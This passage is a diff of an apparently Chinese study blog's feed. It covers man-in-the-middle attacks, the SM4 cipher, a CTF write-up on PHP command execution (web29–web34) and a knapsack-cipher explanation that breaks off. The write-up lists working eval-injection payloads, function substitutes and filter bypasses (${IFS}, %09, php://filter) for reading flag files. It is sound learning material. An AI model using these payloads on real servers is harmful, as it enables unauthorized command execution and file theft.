+<p>一个中间人攻击能成功的前提条件是攻击者能将自己伪装成每一个参与会话的终端，并且不被其他终端识破。中间人攻击是一个（缺乏）相互认证的攻击。大多数的加密协议都专门加入了一些特殊的认证方法以阻止中间人攻击。例如，SSL协议可以验证参与通讯的一方或双方使用的证书是否是由权威的受信任的数字证书认证机构颁发，并且能执行双向身份认证。</p>
+<h3 id="攻击示例"><a href="#攻击示例" class="headerlink" title="攻击示例"></a>攻击示例</h3><p>1.<strong>Alice</strong> 发送给 <strong>Bob</strong> 一条消息，却被 <strong>Mallory</strong> 截获：</p>
+<blockquote>
+<p><strong>Alice</strong>  “嗨，Bob，我是Alice。给我你的公钥” → <strong>Mallory</strong> <strong>Bob</strong></p>
+</blockquote>
+<p>2.<strong>Mallory</strong> 将这条截获的消息转送给 <strong>Bob</strong>；此时 <strong>Bob</strong> 并无法分辨这条消息是否从真的 <strong>Alice</strong> 那里发来的：</p>
+<blockquote>
+<p><strong>Alice</strong> <strong>Mallory</strong>     “嗨，Bob，我是Alice。给我你的公钥” → <strong>Bob</strong></p>
+</blockquote>
+<p>3.<strong>Bob</strong> 回应 <strong>Alice</strong> 的消息，并附上了他的公钥：</p>
+<blockquote>
+<p><strong>Alice</strong> <strong>Mallory</strong> ← <em>[Bob 的公钥]</em> — <strong>Bob</strong></p>
+</blockquote>
+<p>4.<strong>Mallory</strong> 用自己的密钥替换了消息中 <strong>Bob</strong> 的密钥，并将消息转发给 <strong>Alice</strong>，声称这是 <strong>Bob</strong> 的公钥：</p>
+<blockquote>
+<p><strong>Alice</strong> ← <em>[Mallory 的公钥]</em> — <strong>Mallory</strong> <strong>Bob</strong></p>
+</blockquote>
+<p>5.<strong>Alice</strong> 用她以为是 <strong>Bob</strong> 的公钥加密了她的消息，以为只有 <strong>Bob</strong> 才能读到它：</p>
+<blockquote>
+<p><strong>Alice</strong>   “我们在公共汽车站见面！”— [使用 Mallory 的公钥加密] → <strong>Mallory</strong> <strong>Bob</strong></p>
+</blockquote>
+<p>6.然而，由于这个消息实际上是用 <strong>Mallory</strong> 的密钥加密的，所以 <strong>Mallory</strong> 可以解密它，阅读它，并在愿意的时候修改它。她使用 <strong>Bob</strong> 的密钥重新加密，并将重新加密后的消息转发给 <strong>Bob</strong>：</p>
+<blockquote>
+<p><strong>Alice</strong> <strong>Mallory</strong>   “在家等我！”— [使用 Bob 的公钥加密] → <strong>Bob</strong></p>
+</blockquote>
+<p>7.<strong>Bob</strong> 认为，这条消息是经由安全的传输通道从 <strong>Alice</strong> 那里传来的。</p>
+]]></content>
+      <categories>
+        <category>密码学</category>
+      </categories>
+      <tags>
+        <tag>密码学</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SM4</title>
+    <url>/2026/03/23/SM4/</url>
+    <content><![CDATA[<h1 id="SM4"><a href="#SM4" class="headerlink" title="SM4"></a>SM4</h1><p>SM4（原名SMS4）是中華人民共和國政府采用的一种分组密码标准，由国家密码管理局于2012年3月21日发布[。2016年8月，成为中国国家密码标准（GB&#x2F;T 32907-2016。在商用密码体系中，SM4主要用于数据加密，其算法公开，分组长度与密钥长度均为128bit，加密算法与密钥扩展算法都采用32轮非线性迭代结构，S盒为固定的8比特输入8比特输出。</p>
+<span id="more"></span>
+
+<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>SM4 是一种<strong>对称分组密码算法</strong>，分组长度为 <strong>128 bit</strong>，密钥长度为 <strong>128 bit</strong>，。加密算法 与密钥扩展算法均采用非线性迭代结构，共进行 <strong>32 轮迭代</strong>。数据解密和数据加密的算法结构相同, 只是轮密钥的使用顺序相反,解密轮密钥是加密轮密钥的逆序。广泛用于国密体系、金融、政务、通信安全等领域</p>
+<h2 id="整体架构"><a href="#整体架构" class="headerlink" title="整体架构"></a>整体架构</h2><p>设输入明文被表示为四个 32 比特字</p>
 <div class="math-display">
 
 <div class="math-display">\[
-\text{traffic keys} = \mathrm{KDF}(\text{shared secret}, \text{handshake context})
+(X_0,X_1,X_2,X_3)
+\]</div>
+
+</div>
+
+
+<p>则 SM4 在每一轮中都会利用当前的轮密钥 rk_i 和已有的 4 个状态字，生成一个新的 32 比特字。其基本迭代关系为</p>
+<div class="math-display">
+
+<div class="math-display">\[
+X_{i+4}=F(X_i,X_{i+1},X_{i+2},X_{i+3},rk_i),\qquad i=0,1,\dots,31
+\]</div>
+
+</div>
+
+
+<p>其中轮函数 F 定义为</p>
+<div class="math-display">
+
+<div class="math-display">\[
+F(X_0,X_1,X_2,X_3,rk)=X_0\oplus T(X_1\oplus X_2\oplus X_3\oplus rk)
+\]</div>
+
+</div>
+
+
+<p>这里的 T 是 SM4 的核心合成变换，它由<strong>非线性变换</strong>和<strong>线性变换</strong>复合而成，因此每一轮都同时具备“混淆”和“扩散”的作用。</p>
+<p>SM4 的每一轮都可以看成：先将后三个状态字与轮密钥进行异或混合，再经过合成变换 T 处理，最后与最前面的状态字异或，得到新的状态字。这样经过 32 轮迭代之后，算法得到</p>
+<div class="math-display">
+
+<div class="math-display">\[
+(X_{32},X_{33},X_{34},X_{35})
+\]</div>
+
+</div>
+
+
+<p>随后再经过一次<strong>反序变换</strong>，输出最终密文</p>
+<div class="math-display">
+
+<div class="math-display">\[
+(Y_0,Y_1,Y_2,Y_3)=(X_{35},X_{34},X_{33},X_{32})
+\]</div>
+
+</div>
+
+
+<p>也就是说，SM4 的最终输出并不是按照自然顺序直接拼接，而是要将最后四个字逆序排列后再作为密文输出。</p>
+<p>因此，从整体架构上看，SM4 可以概括为：<strong>以 128 比特分组为输入，以 128 比特密钥生成 32 个轮密钥，通过 32 轮迭代轮函数不断更新状态，最后经过反序变换输出密文</strong>。</p>
+<h2 id="明文处理"><a href="#明文处理" class="headerlink" title="明文处理"></a>明文处理</h2><p>在 SM4 中，输入的明文分组长度固定为 <strong>128 比特</strong>。为了便于后续迭代运算将整个 128 比特明文按顺序划分为 <strong>4 个 32 比特字</strong>。标准中将“字”定义为长度为 32 比特的组，因此 SM4 的初始输入状态通常记为</p>
+<div class="math-display">
+
+<div class="math-display">\[
+(X_0,X_1,X_2,X_3)
+\]</div>
+
+</div>
+
+
+<p>其中每个 X_i 都是一个 32 比特字。</p>
+<p>也就是说，如果将一组 128 比特明文记作</p>
+<div class="math-display">
+
+<div class="math-display">\[
+M
+\]</div>
+
+</div>
+
+
+<p>那么在进入加密过程之前，首先要完成的工作就是把它拆分成四个连续的 32 比特部分，分别作为算法的初始输入字：</p>
+<div class="math-display">
+
+<div class="math-display">\[
+M \longrightarrow (X_0,X_1,X_2,X_3)
+\]</div>
+
+</div>
+
+
+<p>后续 32 轮加密迭代，都是在这四个字的基础上不断生成新的状态字，并逐步完成从明文到密文的变换。</p>
+<p>这说明 SM4 从一开始就是“4 个 32 位字”为基本处理对象来组织内部状态的。</p>
+<h2 id="密钥处理"><a href="#密钥处理" class="headerlink" title="密钥处理"></a>密钥处理</h2><p>在 SM4 中，密钥长度固定为 <strong>128 比特</strong>。与明文处理方式类似，为了便于后续的密钥扩展运算，算法会先将 128 比特主密钥按顺序划分为 <strong>4 个 32 比特字</strong>。设主密钥记为</p>
+<div class="math-display">
+
+<div class="math-display">\[
+MK=(MK_0,MK_1,MK_2,MK_3)
+\]</div>
+
+</div>
+
+
+<p>其中每个 MK_i 都是一个 32 比特字。</p>
+<p>也就是说，如果将输入密钥记作</p>
+<div class="math-display">
+
+<div class="math-display">\[
+K
+\]</div>
+
+</div>
+
+
+<p>那么在进入密钥扩展算法之前，首先需要将其拆分为四个连续的 32 比特部分：</p>
+<div class="math-display">
+
+<div class="math-display">\[
+K \longrightarrow (MK_0,MK_1,MK_2,MK_3)
+\]</div>
+
+</div>
+
+
+<p>不过，这四个字并不会直接用于生成轮密钥，而是要先与系统参数 FK 进行一次异或运算，得到密钥扩展的初始状态：</p>
+<div class="math-display">
+
+<div class="math-display">\[
+(K_0,K_1,K_2,K_3)=(MK_0\oplus FK_0,\;MK_1\oplus FK_1,\;MK_2\oplus FK_2,\;MK_3\oplus FK_3)
+\]</div>
+
+</div>
+
+
+<p>其中</p>
+<div class="math-display">
+
+<div class="math-display">\[
+FK=(FK_0,FK_1,FK_2,FK_3)
+\]</div>
+
+</div>
+
+
+<p>FK是 SM4 规定的系统参数，用于初始化密钥扩展过程。</p>
+<p>FK₀ &#x3D; <code>0xA3B1BAC6</code></p>
+<p>FK₁ &#x3D; <code>0x56AA3350</code></p>
+<p>FK₂ &#x3D; <code>0x677D9197</code></p>
+<p>FK₃ &#x3D; <code>0xB27022DC</code></p>
+<p>在得到初始状态 (K_0,K_1,K_2,K_3) 之后，SM4 会继续进行 32 轮密钥扩展。第 i 轮轮密钥的生成公式为</p>
+<div class="math-display">
+
+<div class="math-display">\[
+rk_i=K_{i+4}=K_i\oplus T'(K_{i+1}\oplus K_{i+2}\oplus K_{i+3}\oplus CK_i),\qquad i=0,1,\dots,31
+\]</div>
+
+</div>
+
+
+<p>也就是说，每一轮都会先将后面三个字 K_{i+1},K_{i+2},K_{i+3} 与固定参数 CK_i 进行异或，然后经过变换 T’ 处理，最后再与前面的 K_i 异或，得到新的字 K_{i+4}。而这个新生成的 K_{i+4}，就是当前轮使用的轮密钥 rk_i。</p>
+<p><img src="/images/CK.png" alt="CK"></p>
+<p>换句话说，轮密钥并不是一次性全部算出来的，而是按轮递推生成的：</p>
+<ul>
+<li>第 0 轮：</li>
+</ul>
+<div class="math-display">
+
+<div class="math-display">\[
+rk_0=K_4=K_0\oplus T'(K_1\oplus K_2\oplus K_3\oplus CK_0)
 \]</div>
 
 </div>
 
 
 
-<p>这里的 <code>handshake context</code> 包含握手过程中的随机数、协商参数和握手摘要等信息。</p>
-<p>也就是说，会话密钥不是孤立生成的，而是和本次握手过程绑定在一起。</p>
-<h2 id="记录协议"><a href="#记录协议" class="headerlink" title="记录协议"></a>记录协议</h2><p>握手完成之后，应用层数据不会直接发出去，而是交给 TLS Record 层处理。</p>
-<p>大致流程如下：</p>
+<ul>
+<li>第 1 轮：</li>
+</ul>
+<div class="math-display">
+
+<div class="math-display">\[
+rk_1=K_5=K_1\oplus T'(K_2\oplus K_3\oplus K_4\oplus CK_1)
+\]</div>
+
+</div>
+
+
+
+<ul>
+<li>第 2 轮：</li>
+</ul>
+<div class="math-display">
+
+<div class="math-display">\[
+rk_2=K_6=K_2\oplus T'(K_3\oplus K_4\oplus K_5\oplus CK_2)
+\]</div>
+
+</div>
+
+
+
+<p>依此类推，直到生成第 31 轮轮密钥</p>
+<div class="math-display">
+
+<div class="math-display">\[
+rk_{31}=K_{35}
+\]</div>
+
+</div>
+
+
+<p>因此，SM4 的轮密钥序列</p>
+<div class="math-display">
+
+<div class="math-display">\[
+(rk_0,rk_1,\dots,rk_{31})
+\]</div>
+
+</div>
+
+
+<p>本质上就是由初始的 (K_0,K_1,K_2,K_3) 通过上述递推公式不断向前展开得到的。也就是说，<strong>真正参与每一轮加密运算的 rk_i，都是主密钥经过初始化、再经过 32 轮递推扩展后得到的结果。</strong></p>
+<h2 id="轮函数F"><a href="#轮函数F" class="headerlink" title="轮函数F"></a>轮函数F</h2><p>在 SM4 中，真正推动整个加密过程不断向前迭代的核心，就是轮函数 F。经过明文处理后，算法已经将输入表示为 4 个 32 比特字</p>
+<div class="math-display">
+
+<div class="math-display">\[
+(X_0,X_1,X_2,X_3)
+\]</div>
+
+</div>
+
+
+<p>之后每一轮的任务，就是在当前 4 个状态字和轮密钥的基础上，计算出一个新的 32 比特字，并将其加入到后续状态中。轮函数 F 定义为 </p>
+<div class="math-display">
+
+<div class="math-display">\[
+F(X_0,X_1,X_2,X_3,rk)=X_0\oplus T(X_1\oplus X_2\oplus X_3\oplus rk)
+\]</div>
+
+</div>
+
+
+<p>其中，rk 表示当前轮使用的轮密钥，T 表示一个合成置换，它由后续要介绍的非线性变换和线性变换共同构成。也就是说，轮函数 F 并不是简单地对输入做一次异或，而是先将后三个状态字与轮密钥混合，再经过变换 T 处理，最后再与最前面的状态字 X_0异或，得到当前轮的输出。</p>
+<p>如果把这个过程拆开来看，那么轮函数 F 的计算逻辑可以概括为以下几步。首先，先计算后三个状态字与轮密钥的异或结果：</p>
+<div class="math-display">
+
+<div class="math-display">\[
+A=X_1\oplus X_2\oplus X_3\oplus rk
+\]</div>
+
+</div>
+
+
+<p>然后，将这个中间结果输入到合成置换 T 中：</p>
+<div class="math-display">
+
+<div class="math-display">\[
+B=T(A)
+\]</div>
+
+</div>
+
+
+<p>最后，再将其与最前面的状态字 X_0 进行异或，得到轮函数输出：</p>
+<div class="math-display">
+
+<div class="math-display">\[
+F(X_0,X_1,X_2,X_3,rk)=X_0\oplus B
+\]</div>
+
+</div>
+
+
+<p>因此，从结构上看，SM4 的轮函数可以理解为一种“反馈式”更新机制：它并不是同时修改 4 个状态字，而是利用当前的 4 个字计算出一个新的字，并将这个新字接到状态序列后面。也正因为如此，SM4 的整体迭代关系被写成</p>
+<div class="math-display">
+
+<div class="math-display">\[
+X_{i+4}=F(X_i,X_{i+1},X_{i+2},X_{i+3},rk_i),\qquad i=0,1,\dots,31
+\]</div>
+
+</div>
+
+
+<p>也就是说，第 i 轮并不会直接覆盖原来的 X_i,X_{i+1},X_{i+2},X_{i+3}，而是在它们的基础上生成新的 X_{i+4}，从而推动整个状态不断向前演化。</p>
+<h2 id="合成置换T"><a href="#合成置换T" class="headerlink" title="合成置换T"></a>合成置换T</h2><p>SM4 中的合成置换 T 定义为</p>
+<div class="math-display">
+
+<div class="math-display">\[
+T(\cdot)=L(\tau(\cdot))
+\]</div>
+
+</div>
+
+
+<p>其中，τ  表示非线性变换，L 表示线性变换。也就是说，T 先通过τ  ( S 盒完成字节代换)，再通过线性变换实现扩散，是 SM4 轮函数中的核心变换。</p>
+<h2 id="非线性变换τ"><a href="#非线性变换τ" class="headerlink" title="非线性变换τ"></a>非线性变换τ</h2><p>在合成置换 T 中，第一步就是非线性变换 。它的作用是对输入的 32 比特字进行字节级替换，从而为 SM4 提供最关键的非线性来源。( 其实就是个和AES的sbox查表替换一样)</p>
+<p>设输入为一个 32 比特字</p>
+<div class="math-display">
+
+<div class="math-display">\[
+A=(a_0,a_1,a_2,a_3)\in (Z_2^8)^4
+\]</div>
+
+</div>
+
+
+<p>其中 a_0,a_1,a_2,a_3 分别表示 A 的 4 个字节。经过非线性变换 后，输出记为</p>
+<div class="math-display">
+
+<div class="math-display">\[
+B=(b_0,b_1,b_2,b_3)
+\]</div>
+
+</div>
+
+
+<p>其变换关系为</p>
+<div class="math-display">
+
+<div class="math-display">\[
+(b_0,b_1,b_2,b_3)=\tau(A)=(Sbox(a_0),Sbox(a_1),Sbox(a_2),Sbox(a_3))
+\]</div>
+
+</div>
+
+
+<p>也就是说，τ 的本质就是将输入字中的每一个字节分别送入 SM4 规定的 S 盒，得到对应的新字节，再重新拼接成一个新的 32 比特字。</p>
+<div class="math-display">
+
+<div class="math-display">\[
+b_i=Sbox(a_i),\qquad i=0,1,2,3
+\]</div>
+
+</div>
+
+
+<p>因此，非线性变换τ 可以理解为一种<strong>逐字节替换操作</strong>：它保持字节数不变，但会根据 S 盒查表规则，把每个输入字节替换成另一个输出字节。</p>
+<p><img src="/images/SM4-Sbox.png" alt="SM4-Sbox.png"></p>
+<p>若输入字节为 <code>EF</code>，则应在 S 盒表中查找第 <code>E</code> 行、第 <code>F</code> 列，对应得到的输出为 <code>84</code>，即</p>
+<div class="math-display">
+
+<div class="math-display">\[
+Sbox(\mathrm{EF})=\mathrm{84}
+\]</div>
+
+</div>
+
+
+
+<h2 id="线性变换-L"><a href="#线性变换-L" class="headerlink" title="线性变换 L"></a>线性变换 L</h2><p>在线性变换 完成字节代换之后，SM4 还需要进一步将这种非线性效果扩散到更多比特位置上，这一步就是线性变换 L。设 τ 的输出为一个 32 比特字 B，则线性变换 L 定义为</p>
+<div class="math-display">
+
+<div class="math-display">\[
+L(B)=B\oplus(B\lll2)\oplus(B\lll10)\oplus(B\lll18)\oplus(B\lll24)
+\]</div>
+
+</div>
+
+
+
+
+<div class="math-display">
+
+<div class="math-display">\[
+其中，\lll i 表示将 32 比特字循环左移 i 位
+\]</div>
+
+</div>
+
+
+
+<p>也就是说，L 会将输入字 B 本身与其循环左移 2 位、10 位、18 位和 24 位后的结果分别进行异或，从而得到新的 32 比特输出。这样一来，输入中某一位的变化就会通过移位和异或传播到输出的多个位置，从而增强算法的扩散能力。</p>
+<p>随后，轮函数会将这个结果再与当前最前面的状态字进行异或，从而生成新的状态字，并作为下一轮迭代的一部分继续参与运算。也就是说，SM4 并不是只进行一次这样的变换，而是不断重复这一过程：每一轮都利用当前的 4 个状态字和对应的轮密钥，生成一个新的状态字，再推动整个状态向前更新。</p>
+<p>经过 32 轮迭代之后，算法最终得到</p>
+<div class="math-display">
+
+<div class="math-display">\[
+(X_{32},X_{33},X_{34},X_{35})
+\]</div>
+
+</div>
+
+
+<p>不过，这 4 个字并不会按当前顺序直接输出，而是还需要经过一次反序变换，重新排列为</p>
+<div class="math-display">
+
+<div class="math-display">\[
+(Y_0,Y_1,Y_2,Y_3)=(X_{35},X_{34},X_{33},X_{32})
+\]</div>
+
+</div>
+
+
+<p>这样得到的结果，才是 SM4 的最终密文</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>SM4 是一种 <strong>128 比特分组、128 比特密钥</strong> 的对称分组密码算法，共进行 <strong>32 轮迭代</strong>。在加密开始时，算法首先将 128 比特明文划分为 4 个 32 比特字</p>
+<div class="math-display">
+
+<div class="math-display">\[
+(X_0,X_1,X_2,X_3)
+\]</div>
+
+</div>
+
+
+<p>同时，将 128 比特主密钥划分为 4 个 32 比特字，并经过初始化和密钥扩展生成 32 个轮密钥</p>
+<div class="math-display">
+
+<div class="math-display">\[
+(rk_0,rk_1,\dots,rk_{31})
+\]</div>
+
+</div>
+
+
+<p>供后续每一轮加密使用。</p>
+<p>在每一轮中，SM4 都会先将后三个状态字与当前轮密钥进行异或，再送入合成置换 T。其中T 先通过非线性变换τ 完成 S 盒替换，再通过线性变换 L实现扩散，最后再与最前面的状态字异或，生成新的状态字。其轮函数可表示为</p>
+<div class="math-display">
+
+<div class="math-display">\[
+X_{i+4}=X_i\oplus T(X_{i+1}\oplus X_{i+2}\oplus X_{i+3}\oplus rk_i),\qquad i=0,1,\dots,31
+\]</div>
+
+</div>
+
+
+<p>也就是说，SM4 正是通过这样的轮函数迭代，不断将明文状态推进到新的状态。</p>
+<p>当 32 轮运算全部结束后，算法得到</p>
+<div class="math-display">
+
+<div class="math-display">\[
+(X_{32},X_{33},X_{34},X_{35})
+\]</div>
+
+</div>
+
+
+<p>最后再经过一次反序变换，输出密文</p>
+<div class="math-display">
+
+<div class="math-display">\[
+(Y_0,Y_1,Y_2,Y_3)=(X_{35},X_{34},X_{33},X_{32})
+\]</div>
+
+</div>
+
+
+<p>因此，从整体上看，SM4 的加密过程可以概括为：<strong>明文分组、密钥扩展、32 轮轮函数迭代，以及最终的反序输出。</strong></p>
+]]></content>
+      <categories>
+        <category>密码学</category>
+      </categories>
+      <tags>
+        <tag>密码学</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Web</title>
+    <url>/2026/02/24/Web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
+    <content><![CDATA[<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><span id="more"></span>
+
+<h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><p><img src="/images/web29.png" alt="web29"></p>
+<p>检查GET请求中是否存在名为’c’的参数，并将值赋给<span class="math-inline">(c，正则匹配检查)</span>c是否包含‘flag’，其中&#x2F;i表示不区分大小写</p>
+<p>，当没有匹配到‘flag’时执行eval函数</p>
+<p>那先看看目录下有什么文件,使c&#x3D;system(‘ls’)</p>
+<p>有flag.php</p>
+<p>直接<em><em>c&#x3D;system(‘tac f</em>‘)</em>*</p>
+<p>也可以cp复制文件,把flag .php 文件复制为 1.txt,再访问1.txt</p>
+<p>即<em><em>c&#x3D;system(‘cp fla</em>.php 1.txt’);</em>*</p>
+<h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><p><img src="/images/web30.png" alt="web30"></p>
+<p>这次多禁用了system和php</p>
+<p>system还可以用exec和passthru代替</p>
+<p>关于这两个函数的区别</p>
+<p><img src="/images/web30a.png" alt="web30a"></p>
+<p><em><em>?c&#x3D;passthru(‘tac f</em>‘);</em>*</p>
+<p><em><em>?c&#x3D;echo exec(‘cat fla</em>‘);</em>*</p>
+<p>还有<em><em>c&#x3D;passthru(‘cp fla</em>.php 1.txt’);</em>*</p>
+<h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><p><img src="/images/web31.png" alt="web31"></p>
+<p>限制了flag,system,php,cat,sort,shell,点号,空格,单引号</p>
+<p><strong>1.嵌套参数:</strong></p>
+<p>先使c&#x3D;eval($_GET[1]),再1&#x3D;system(“tac flag.php”);,</p>
+<p>即**?c&#x3D;eval($_GET[1]);&amp;1&#x3D;system(“tac flag.php”);**</p>
+<p><strong>2.对于空格</strong>,我们可以使用%09,浏览器访问时会自动把<code>%09</code>解码为 Tab 字符，执行效果和空格完全一样，同时避开了空格的过滤规则,也可以使用**<span class="math-inline">(IFS)</span>9<strong>和</strong>${IFS}**替代</p>
+<p>𝐼𝐹𝑆绕过：在𝑙𝑖𝑛𝑢𝑥下，{IFS}是分隔符的意思，所以可以有${IFS}进行空格的替代。</p>
+<p>𝐼𝐹𝑆9绕过：$起截断作用，9为当前shell进程的第九个参数，始终为空字符串，所以同样能代替空字符串进行分割</p>
+<p><em>?c&#x3D;passthru(“tac%09fla</em>“);</p>
+<p>?c&#x3D;passthru(“tac\${IFS}fla*”);</p>
+<p>?c&#x3D;passthru(“tac\<span class="math-inline">({IFS}\)</span>9f*”);</p>
+<p>上述的反斜杠用于对<span class="math-inline">(进行转义()</span>在 URL &#x2F; 服务器中是特殊字符，但在 Shell 中是环境变量标识，反斜杠解决了这个 “双重解析” 的冲突)</p>
+<p><strong>3.读取文件</strong></p>
+<p><code>highlight_file()</code> 是 PHP 的核心函数，<strong>作用是读取指定文件的内容，并按照 PHP 语法高亮的格式输出到页面上</strong></p>
+<p>既然过滤了flag,base64编码后解码就行了,即(base64_decode(“ZmxhZy5waHA&#x3D;”)</p>
+<p>?c&#x3D;highlight_file(base64_decode(“ZmxhZy5waHA&#x3D;”));</p>
+<p>也可替换成<strong>show_source</strong></p>
+<h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><p><img src="/images/web32.png" alt="web32"></p>
+<p>限制了flag,system,php,cat,sort,shell,echo,点号,空格,单引号,分号,左括号</p>
+<p>因为禁用了左括号,上面的思路看来行不通了</p>
+<p>我们可以使用<strong>include语句,include语句用于在执行流中插入写在其他文件中的有用的代码</strong></p>
+<p>那先构造c&#x3D;include $_GET[1]</p>
+<p>发现空格和分号,前者可以用%09替代,后者可以用php闭合标签**?&gt;**替代</p>
+<p>即c&#x3D;include%09$_GET[1]?&gt;</p>
+<p>&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
+<h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><p><img src="/images/web33.png" alt="web33"></p>
+<p>?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
+<h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><p><img src="/images/web34.png" alt="web34"></p>
+<p>?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Crypto-Knapsack Problem</title>
+    <url>/2026/02/06/Crypto-Knapsack%20Problem/</url>
+    <content><![CDATA[<h1 id="背包密码体制"><a href="#背包密码体制" class="headerlink" title="背包密码体制"></a>背包密码体制</h1><p>背包密码体制（Knapsack Cryptosystem）是一类基于背包问题构造的公钥密码方案。它的基本思想是：将明文比特串映射为一个整数，再通过一组权重的线性组合生成密文。</p>
+<h2 id="1-背包问题"><a href="#1-背包问题" class="headerlink" title="1. 背包问题"></a>1. 背包问题</h2><p>经典背包问题可以表述为：给定一组正整数</p>
+<div class="math-display">
+
+<div class="math-display">\[
+a_1, a_2, \dots, a_n
+\]</div>
+
+</div>
+
+
+
+<p>以及一个目标值 <span class="math-inline">(W)</span>，判断是否存在一组二进制变量 <span class="math-inline">(x_i \in 0,1)</span>，使得</p>
+<div class="math-display">
+
+<div class="math-display">\[
+\sum_{i=1}^{n} x_i a_i = W
+\]</div>
+
+</div>
+
+
+
+<p>如果允许穷举所有 <span class="math-inline">(2^n)</span> 种组合，那么该问题可以直接求解；但当 <span class="math-inline">(n)</span> 较大时，穷举代价会迅速增长，因此背包问题具有较高的计算复杂度。</p>
+<p>背包密码体制正是利用了这一点：对外公开一个看似难以求解的背包实例，使攻击者难以从密文恢复明文。</p>
+<h2 id="2-基本加密思想"><a href="#2-基本加密思想" class="headerlink" title="2. 基本加密思想"></a>2. 基本加密思想</h2><p>设明文是一个 <span class="math-inline">(n)</span> 位二进制串</p>
+<div class="math-display">
+
+<div class="math-display">\[
+x = (x_1, x_2, \dots, x_n), \quad x_i \in 0,1
+\]</div>
+
+</div>
+
+
+
+<p>给定一组公开权重</p>
+<div class="math-display">
+
+<div class="math-display">\[
+a_1, a_2, \dots, a_n
+\]</div>
+
+</div>
+
+
+
+<p>则可以把密文构造为：</p>
+<div class="math-display">
+
+<div class="math-display">\[
+C = \sum_{i=1}^{n} x_i a_i
+\]</div>
+
+</div>
+
+
+
+<p>从形式上看，这就是把明文比特作为系数，去选择性地累加某些权重。</p>
+<p>如果这些权重没有额外结构，那么从 <span class="math-inline">(C)</span> 反推出 <span class="math-inline">(x)</span> 一般是困难的，这正是背包密码的设计基础。</p>
+<h2 id="3-超递增序列"><a href="#3-超递增序列" class="headerlink" title="3. 超递增序列"></a>3. 超递增序列</h2><p>为了便于解密，可以构造一类特殊的序列，称为<strong>超递增序列</strong>（superincreasing sequence）。它满足：</p>
+<div class="math-display">
+
+<div class="math-display">\[
+a_i &amp;gt; \sum_{k=1}^{i-1} a_k, \quad i=2,3,\dots,n
+\]</div>
+
+</div>
+
+
+
+<p>也就是说，每一项都大于前面所有项之和。</p>
+<p>例如：</p>
+<div class="math-display">
+
+<div class="math-display">\[
+1,\ 3,\ 6,\ 11,\ 23,\ 45
+\]</div>
+
+</div>
+
+
+
+<p>就是一个超递增序列，因为它满足：</p>
+<div class="math-display">
+
+<div class="math-display">\[
+3 &amp;gt; 1,
+\quad 6 &amp;gt; 1+3,
+\quad 11 &amp;gt; 1+3+6,
+\]</div>
+
+</div>
+
+
+
+<p>依次类推。</p>
+<h3 id="3-1-为什么它容易解密"><a href="#3-1-为什么它容易解密" class="headerlink" title="3.1 为什么它容易解密"></a>3.1 为什么它容易解密</h3><p>如果使用超递增序列加密，那么解密可以从后向前进行：</p>
+<ul>
+<li>如果当前密文 <span class="math-inline">(C)</span> 大于某一项 <span class="math-inline">(a_i)</span>，则说明对应的 <span class="math-inline">(x_i &#x3D; 1)</span></li>
+<li>否则，说明 <span class="math-inline">(x_i &#x3D; 0)</span></li>
+</ul>
+<p>确定 <span class="math-inline">(x_i)</span> 后，再令</p>
+<div class="math-display">
+
+<div class="math-display">\[
+C \leftarrow C - x_i a_i
+\]</div>
+
+</div>
+
+
+
+<p>继续判断下一项即可。</p>
+<p>由于每一项都大于前面所有项之和，所以这种贪心判断是正确的。</p>
+<h2 id="4-简单超递增背包体制"><a href="#4-简单超递增背包体制" class="headerlink" title="4. 简单超递增背包体制"></a>4. 简单超递增背包体制</h2><p>设私钥为一个超递增序列：</p>
+<div class="math-display">
+
+<div class="math-display">\[
+w_1, w_2, \dots, w_n
+\]</div>
+
+</div>
+
+
+
+<p>给定明文比特串 <span class="math-inline">(x_1, x_2, \dots, x_n)</span>，加密为：</p>
+<div class="math-display">
+
+<div class="math-display">\[
+C = \sum_{i=1}^{n} x_i w_i
+\]</div>
+
+</div>
+
+
+
+<p>解密时，按从后向前的顺序恢复：</p>
 <ol>
-<li>将数据切分为记录</li>
-<li>对记录进行加密</li>
-<li>加上完整性校验</li>
-<li>发送给对方</li>
+<li>判断 <span class="math-inline">(C)</span> 是否大于 <span class="math-inline">(w_n)</span></li>
+<li>若是，则 <span class="math-inline">(x_n &#x3D; 1)</span>，并令 <span class="math-inline">(C \leftarrow C - w_n)</span></li>
+<li>否则 <span class="math-inline">(x_n &#x3D; 0)</span></li>
+<li>对 <span class="math-inline">(w_{n-1}, w_{n-2}, \dots, w_1)</span> 重复上述过程</li>
 </ol>
-<p>现代 TLS 常用 AEAD 算法，例如：</p>
+<p>这种方案的缺点也很明显：如果直接公开超递增序列，那么攻击者同样可以用贪心算法轻松解密，因此它不能直接作为公钥方案使用。</p>
+<h2 id="5-由私钥到公钥"><a href="#5-由私钥到公钥" class="headerlink" title="5. 由私钥到公钥"></a>5. 由私钥到公钥</h2><p>为了让系统具备公钥密码体制的特点，通常会对超递增序列进行变换。</p>
+<p>一种经典做法是：</p>
 <ul>
-<li>AES-GCM</li>
-<li>ChaCha20-Poly1305</li>
+<li>选取超递增序列 <span class="math-inline">(w_1, w_2, \dots, w_n)</span></li>
+<li>选取模数 <span class="math-inline">(m)</span>，满足</li>
 </ul>
